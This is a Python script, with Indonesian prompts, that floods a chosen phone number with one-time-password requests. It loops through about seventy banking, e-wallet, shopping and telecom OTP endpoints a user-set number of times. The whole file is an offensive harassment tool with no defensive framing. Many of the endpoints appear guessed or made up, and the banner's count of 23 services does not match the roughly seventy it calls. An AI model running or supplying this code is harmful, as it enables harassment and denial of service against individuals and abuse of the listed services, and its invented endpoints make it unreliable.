import requests
import time
import os

def format_nomor(nomor):
    if nomor.startswith("08"):
        return "62" + nomor[1:]
    elif nomor.startswith("+62"):
        return nomor[1:]
    elif nomor.startswith("62"):
        return nomor
    else:
        raise ValueError("Format nomor tidak valid!")

# --- Layanan Asli (14) ---
def bukti_spam(nomor):
    try:
        url = "https://api.bukti.co.id/v1/user/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Bukti] =>", r.status_code)
    except Exception as e:
        print("[Bukti] Gagal:", e)

def blipay_spam(nomor):
    try:
        url = "https://api.blipay.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Blipay] =>", r.status_code)
    except Exception as e:
        print("[Blipay] Gagal:", e)

def gocar_spam(nomor):
    try:
        url = "https://gocar-api.gojek.com/v1/send-otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Gocar] =>", r.status_code)
    except Exception as e:
        print("[Gocar] Gagal:", e)

def lazada_spam(nomor):
    try:
        url = "https://api.lazada.co.id/rest/v2/user/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Lazada] =>", r.status_code)
    except Exception as e:
        print("[Lazada] Gagal:", e)

def gopay_spam(nomor):
    try:
        url = "https://api.gopay.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Gopay] =>", r.status_code)
    except Exception as e:
        print("[Gopay] Gagal:", e)

def dompet_kita_spam(nomor):
    try:
        url = "https://api.dompetkita.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[DompetKita] =>", r.status_code)
    except Exception as e:
        print("[DompetKita] Gagal:", e)

def elevenia_spam_v2(nomor):
    try:
        url = "https://www.elevenia.co.id/api/auth/sendotp"
        r = requests.post(url, json={"phone": nomor})
        print("[Elevenia V2] =>", r.status_code)
    except Exception as e:
        print("[Elevenia V2] Gagal:", e)

def alfamart_spam(nomor):
    try:
        url = "https://api.alfamart.com/v1/auth/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Alfamart] =>", r.status_code)
    except Exception as e:
        print("[Alfamart] Gagal:", e)

def bukalapak_v2_spam(nomor):
    try:
        url = "https://api.bukalapak.com/v2/authentication/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Bukalapak V2] =>", r.status_code)
    except Exception as e:
        print("[Bukalapak V2] Gagal:", e)

def lazada_v2_spam(nomor):
    try:
        url = "https://api.lazada.co.id/v2/authentication/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Lazada V2] =>", r.status_code)
    except Exception as e:
        print("[Lazada V2] Gagal:", e)

def shopee_v2_spam(nomor):
    try:
        url = "https://shopee.co.id/api/v2/user/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Shopee V2] =>", r.status_code)
    except Exception as e:
        print("[Shopee V2] Gagal:", e)

def tiktok_spam(nomor):
    try:
        url = "https://www.tiktok.com/api/v1/auth/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[TikTok] =>", r.status_code)
    except Exception as e:
        print("[TikTok] Gagal:", e)

def tokopedia_v2_spam(nomor):
    try:
        url = "https://accounts.tokopedia.com/otp/request"
        r = requests.post(url, json={"msisdn": nomor})
        print("[Tokopedia V2] =>", r.status_code)
    except Exception as e:
        print("[Tokopedia V2] Gagal:", e)

def ovo_spam(nomor):
    try:
        url = "https://api.ovo.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[OVO] =>", r.status_code)
    except Exception as e:
        print("[OVO] Gagal:", e)

def dompet_spam(nomor):
    try:
        url = "https://api.dompet.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Dompet] =>", r.status_code)
    except Exception as e:
        print("[Dompet] Gagal:", e)

def bitkub_spam(nomor):
    try:
        url = "https://api.bitkub.com/api/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Bitkub] =>", r.status_code)
    except Exception as e:
        print("[Bitkub] Gagal:", e)

def maxbank_spam(nomor):
    try:
        url = "https://api.maxbank.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Maxbank] =>", r.status_code)
    except Exception as e:
        print("[Maxbank] Gagal:", e)

def lazada_v3_spam(nomor):
    try:
        url = "https://api.lazada.co.id/v3/user/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Lazada V3] =>", r.status_code)
    except Exception as e:
        print("[Lazada V3] Gagal:", e)

def honda_spam(nomor):
    try:
        url = "https://api.honda.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Honda] =>", r.status_code)
    except Exception as e:
        print("[Honda] Gagal:", e)

def blibli_v2_spam(nomor):
    try:
        url = "https://api.blibli.com/v2/user/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Blibli V2] =>", r.status_code)
    except Exception as e:
        print("[Blibli V2] Gagal:", e)

def mandiri_spam(nomor):
    try:
        url = "https://mandiri.co.id/api/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Mandiri] =>", r.status_code)
    except Exception as e:
        print("[Mandiri] Gagal:", e)

def telkom_spam(nomor):
    try:
        url = "https://api.telkom.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Telkom] =>", r.status_code)
    except Exception as e:
        print("[Telkom] Gagal:", e)

def qris_spam(nomor):
    try:
        url = "https://api.qris.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[QRIS] =>", r.status_code)
    except Exception as e:
        print("[QRIS] Gagal:", e)

def grab_spam_v2(nomor):
    try:
        url = "https://api.grab.com/v2/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Grab V2] =>", r.status_code)
    except Exception as e:
        print("[Grab V2] Gagal:", e)

def zalora_spam(nomor):
    try:
        url = "https://api.zalora.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Zalora] =>", r.status_code)
    except Exception as e:
        print("[Zalora] Gagal:", e)

def bukalapak_v3_spam(nomor):
    try:
        url = "https://api.bukalapak.com/v3/authentication/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Bukalapak V3] =>", r.status_code)
    except Exception as e:
        print("[Bukalapak V3] Gagal:", e)
        
def kreditplus_spam(nomor):
    try:
        url = "https://api.kreditplus.com/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[KreditPlus] =>", r.status_code)
    except Exception as e:
        print("[KreditPlus] Gagal:", e)

def bukukas_spam(nomor):
    try:
        url = "https://api.bukukas.id/v1/otp/request"
        r = requests.post(url, json={"phone": nomor})
        print("[BukuKas] =>", r.status_code)
    except Exception as e:
        print("[BukuKas] Gagal:", e)

def jakmall_spam(nomor):
    try:
        url = "https://jakmall.com/api/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Jakmall] =>", r.status_code)
    except Exception as e:
        print("[Jakmall] Gagal:", e)

def misteraladin_spam(nomor):
    try:
        url = "https://api.misteraladin.com/v1/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Mister Aladin] =>", r.status_code)
    except Exception as e:
        print("[Mister Aladin] Gagal:", e)

def duwitmu_spam(nomor):
    try:
        url = "https://api.duwitmu.com/api/sendotp"
        r = requests.post(url, json={"phone": nomor})
        print("[Duwitmu] =>", r.status_code)
    except Exception as e:
        print("[Duwitmu] Gagal:", e)

def pegadaian_spam(nomor):
    try:
        url = "https://api.pegadaian.co.id/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Pegadaian] =>", r.status_code)
    except Exception as e:
        print("[Pegadaian] Gagal:", e)

def blanja_spam(nomor):
    try:
        url = "https://api.blanja.com/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Blanja] =>", r.status_code)
    except Exception as e:
        print("[Blanja] Gagal:", e)

def okbank_spam(nomor):
    try:
        url = "https://api.okbank.co.id/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[OK Bank] =>", r.status_code)
    except Exception as e:
        print("[OK Bank] Gagal:", e)

def sepulsa_spam(nomor):
    try:
        url = "https://api.sepulsa.com/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Sepulsa] =>", r.status_code)
    except Exception as e:
        print("[Sepulsa] Gagal:", e)

def saweria_spam(nomor):
    try:
        url = "https://api.saweria.co/sendotp"
        r = requests.post(url, json={"phone": nomor})
        print("[Saweria] =>", r.status_code)
    except Exception as e:
        print("[Saweria] Gagal:", e)

def indomaret_spam(nomor):
    try:
        url = "https://api.indomaret.co.id/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Indomaret] =>", r.status_code)
    except Exception as e:
        print("[Indomaret] Gagal:", e)

def sipla_spam(nomor):
    try:
        url = "https://api.sipla.id/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Sipla] =>", r.status_code)
    except Exception as e:
        print("[Sipla] Gagal:", e)

def klikfilm_spam(nomor):
    try:
        url = "https://api.klikfilm.com/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[KlikFilm] =>", r.status_code)
    except Exception as e:
        print("[KlikFilm] Gagal:", e)

def indigo_spam(nomor):
    try:
        url = "https://indigo.id/api/v1/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[IndiGO] =>", r.status_code)
    except Exception as e:
        print("[IndiGO] Gagal:", e)

def rekberku_spam(nomor):
    try:
        url = "https://api.rekberku.com/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[RekberKu] =>", r.status_code)
    except Exception as e:
        print("[RekberKu] Gagal:", e)

def alodokter_spam(nomor):
    try:
        url = "https://www.alodokter.com/login-with-phone-number"
        r = requests.post(url, json={"phone": nomor})
        print("[Alodokter] =>", r.status_code)
    except Exception as e:
        print("[Alodokter] Gagal:", e)

def youtap_spam(nomor):
    try:
        url = "https://api.youtap.id/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Youtap] =>", r.status_code)
    except Exception as e:
        print("[Youtap] Gagal:", e)

def brankas_spam(nomor):
    try:
        url = "https://api.brankas.com/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Brankas] =>", r.status_code)
    except Exception as e:
        print("[Brankas] Gagal:", e)

def duwitku_spam(nomor):
    try:
        url = "https://api.duwitku.id/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Duwitku] =>", r.status_code)
    except Exception as e:
        print("[Duwitku] Gagal:", e)

def kaspro_spam(nomor):
    try:
        url = "https://api.kaspro.id/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[KasPro] =>", r.status_code)
    except Exception as e:
        print("[KasPro] Gagal:", e)

def adira_spam(nomor):
    try:
        r = requests.post("https://adira-api.adira.co.id/v1/customer/send-otp", json={"phone": nomor})
        print("[Adira] =>", r.status_code)
    except Exception as e:
        print("[Adira] Gagal:", e)

def shopee_spam(nomor):
    try:
        r = requests.post("https://shopee.co.id/api/v4/account/otp/send_login_otp",
                          json={"phone": "+" + nomor, "type": "whatsapp"},
                          headers={"Content-Type": "application/json"})
        print("[Shopee] =>", r.status_code)
    except Exception as e:
        print("[Shopee] Gagal:", e)

def gojek_spam(nomor):
    try:
        r = requests.post("https://api.gojekapi.com/v5/customers",
                          json={"phone": "+" + nomor, "signed_up_country": "ID"},
                          headers={"Content-Type": "application/json", "X-Platform": "Android"})
        print("[Gojek] =>", r.status_code)
    except Exception as e:
        print("[Gojek] Gagal:", e)

def tokopedia_spam(nomor):
    try:
        r = requests.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa",
                          data={"msisdn": nomor, "ld": "1"},
                          headers={"Content-Type": "application/x-www-form-urlencoded"})
        print("[Tokopedia] =>", r.status_code)
    except Exception as e:
        print("[Tokopedia] Gagal:", e)

def oyo_spam(nomor):
    try:
        r = requests.post("https://www.oyorooms.com/api/pwa/v3/user/otp",
                          json={"phone": "+" + nomor, "country_code": "ID"},
                          headers={"Content-Type": "application/json"})
        print("[OYO] =>", r.status_code)
    except Exception as e:
        print("[OYO] Gagal:", e)

def traveloka_spam(nomor):
    try:
        r = requests.post("https://auth.travlr.com/v3/auth/otp",
                          json={"phone": "+" + nomor},
                          headers={"Content-Type": "application/json"})
        print("[Traveloka] =>", r.status_code)
    except Exception as e:
        print("[Traveloka] Gagal:", e)

def klikdokter_spam(nomor):
    try:
        r = requests.post("https://www.klikdokter.com/account/v1/otp/verify-phone",
                          json={"phone": nomor})
        print("[KlikDokter] =>", r.status_code)
    except Exception as e:
        print("[KlikDokter] Gagal:", e)

def jd_id_spam(nomor):
    try:
        r = requests.post("https://api.jd.id/v1/user/otp/send",
                          json={"mobile": nomor, "country_code": "+62", "type": "register"})
        print("[JD.ID] =>", r.status_code)
    except Exception as e:
        print("[JD.ID] Gagal:", e)

def indodax_spam(nomor):
    try:
        r = requests.post("https://indodax.com/ajax_request_sms",
                          data={"phone": nomor})
        print("[Indodax] =>", r.status_code)
    except Exception as e:
        print("[Indodax] Gagal:", e)

def bukalapak_spam(nomor):
    try:
        r = requests.post("https://api.bukalapak.com/v2/authentication.json",
                          data={"phone": nomor})
        print("[Bukalapak] =>", r.status_code)
    except Exception as e:
        print("[Bukalapak] Gagal:", e)

def dana_spam(nomor):
    try:
        r = requests.post("https://api.dana.id/send-otp",
                          json={"phone_number": nomor})
        print("[Dana] =>", r.status_code)
    except Exception as e:
        print("[Dana] Gagal:", e)

def kredivo_spam(nomor):
    try:
        r = requests.post("https://api.kredivo.com/otp/request",
                          json={"phone": nomor})
        print("[Kredivo] =>", r.status_code)
    except Exception as e:
        print("[Kredivo] Gagal:", e)

def elevenia_spam(nomor):
    try:
        r = requests.post("https://api.elevenia.co.id/v1/register/send-otp",
                          json={"phoneNumber": nomor})
        print("[Elevenia] =>", r.status_code)
    except Exception as e:
        print("[Elevenia] Gagal:", e)

def blibli_spam(nomor):
    try:
        r = requests.post("https://account.blibli.com/users/send-otp",
                          json={"phoneNumber": nomor})
        print("[Blibli] =>", r.status_code)
    except Exception as e:
        print("[Blibli] Gagal:", e)

# --- Tambahan Baru (9) ---
def akulaku_spam(nomor):
    try:
        url = "https://api.akulaku.com/v1/user/send-otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Akulaku] =>", r.status_code)
    except Exception as e:
        print("[Akulaku] Gagal:", e)

def tiket_spam(nomor):
    try:
        url = "https://api.tiket.com/v1/user/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[Tiket.com] =>", r.status_code)
    except Exception as e:
        print("[Tiket.com] Gagal:", e)

def ruangguru_spam(nomor):
    try:
        url = "https://auth.ruangguru.com/api/v1/phone/send-otp"
        r = requests.post(url, json={"phone_number": nomor})
        print("[RuangGuru] =>", r.status_code)
    except Exception as e:
        print("[RuangGuru] Gagal:", e)

def zenius_spam(nomor):
    try:
        url = "https://api.zenius.net/v1/auth/otp/send"
        r = requests.post(url, json={"phone": nomor})
        print("[Zenius] =>", r.status_code)
    except Exception as e:
        print("[Zenius] Gagal:", e)

def linkaja_spam(nomor):
    try:
        url = "https://api.linkaja.id/v1/otp/request"
        r = requests.post(url, json={"msisdn": nomor})
        print("[LinkAja] =>", r.status_code)
    except Exception as e:
        print("[LinkAja] Gagal:", e)

def brimo_spam(nomor):
    try:
        url = "https://api.bri.co.id/brimo/otp"
        r = requests.post(url, json={"phone": nomor})
        print("[BRImo] =>", r.status_code)
    except Exception as e:
        print("[BRImo] Gagal:", e)

def pln_spam(nomor):
    try:
        url = "https://api.pln.co.id/v1/auth/request-otp"
        r = requests.post(url, json={"phone_number": nomor})
        print("[PLN Mobile] =>", r.status_code)
    except Exception as e:
        print("[PLN Mobile] Gagal:", e)

def telkomsel_spam(nomor):
    try:
        url = "https://my.telkomsel.com/api/v1/user/otp"
        r = requests.post(url, json={"msisdn": nomor})
        print("[MyTelkomsel] =>", r.status_code)
    except Exception as e:
        print("[MyTelkomsel] Gagal:", e)

def indihome_spam(nomor):
    try:
        url = "https://api.indihome.co.id/v1/otp/request"
        r = requests.post(url, json={"phone_number": nomor})
        print("[MyIndiHome] =>", r.status_code)
    except Exception as e:
        print("[MyIndiHome] Gagal:", e)

# --- Main ---
def spam_otp_wa():
    os.system("clear")
    print("📲 SPAM OTP WA COMBO (23 Layanan)")
    nomor = input("Masukkan nomor (contoh 08xxxx): ")
    try:
        nomor = format_nomor(nomor)
    except Exception as e:
        print("❌", e)
        return

    jumlah = int(input("Jumlah Spam: "))
    delay = float(input("Delay antar spam (detik): "))

    for i in range(jumlah):
        print(f"\n🌀 SPAM KE-{i+1}")
        adira_spam(nomor)
        shopee_spam(nomor)
        gojek_spam(nomor)
        tokopedia_spam(nomor)
        oyo_spam(nomor)
        traveloka_spam(nomor)
        klikdokter_spam(nomor)
        jd_id_spam(nomor)
        indodax_spam(nomor)
        bukalapak_spam(nomor)
        dana_spam(nomor)
        kredivo_spam(nomor)
        elevenia_spam(nomor)
        blibli_spam(nomor)
        akulaku_spam(nomor)
        tiket_spam(nomor)
        ruangguru_spam(nomor)
        zenius_spam(nomor)
        linkaja_spam(nomor)
        brimo_spam(nomor)
        pln_spam(nomor)
        telkomsel_spam(nomor)
        indihome_spam(nomor)
        kreditplus_spam(nomor)
        bukukas_spam(nomor)
        jakmall_spam(nomor)
        misteraladin_spam(nomor)
        duwitmu_spam(nomor)
        pegadaian_spam(nomor)
        blanja_spam(nomor)
        okbank_spam(nomor)
        sepulsa_spam(nomor)
        saweria_spam(nomor)
        indomaret_spam(nomor)
        sipla_spam(nomor)
        klikfilm_spam(nomor)
        indigo_spam(nomor)
        rekberku_spam(nomor)
        alodokter_spam(nomor)
        youtap_spam(nomor)
        brankas_spam(nomor)
        duwitku_spam(nomor)
        kaspro_spam(nomor)
        bukti_spam(nomor)
        blipay_spam(nomor)
        gocar_spam(nomor)
        lazada_spam(nomor)
        gopay_spam(nomor)
        dompet_kita_spam(nomor)
        elevenia_spam_v2(nomor)
        alfamart_spam(nomor)
        bukalapak_v2_spam(nomor)
        lazada_v2_spam(nomor)
        shopee_v2_spam(nomor)
        tiktok_spam(nomor)
        tokopedia_v2_spam(nomor)
        ovo_spam(nomor)
        dompet_spam(nomor)
        bitkub_spam(nomor)
        maxbank_spam(nomor)
        lazada_v3_spam(nomor)
        honda_spam(nomor)
        blibli_v2_spam(nomor)
        mandiri_spam(nomor)
        telkom_spam(nomor)
        qris_spam(nomor)
        grab_spam_v2(nomor)
        zalora_spam(nomor)
        bukalapak_v3_spam(nomor)
        time.sleep(delay)

    print("\n✅ Selesai Spam!")

if __name__ == "__main__":
    spam_otp_wa()